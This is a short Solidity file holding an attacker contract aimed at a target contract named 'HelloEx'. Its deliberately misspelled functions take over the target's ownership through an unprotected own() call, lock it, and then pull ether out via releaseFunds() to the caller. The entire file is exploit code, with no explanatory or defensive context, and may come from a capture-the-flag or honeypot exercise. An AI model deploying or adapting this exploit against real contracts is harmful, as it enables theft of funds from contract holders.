pragma solidity ^0.4.24;
contract HelloEx{

	function own(address owner) {}

	function releaseFunds(uint amount) {}

	function lock() {}
}

contract Call{

	address owner;

	HelloEx contr;

	constructor() public
	{
		owner = msg.sender;
	}

	function setMyContractt(address addr) public
	{
		require(owner==msg.sender);
		contr = HelloEx(addr);
	}

	function eexploitOwnn() payable public
	{
		require(owner==msg.sender);
		contr.own(address(this));
		contr.lock();
	}

	function wwwithdrawww(uint amount) public
	{
		require(owner==msg.sender);
		contr.releaseFunds(amount);
		msg.sender.transfer(amount * (1 ether));
	}

	function () payable public
	{}
}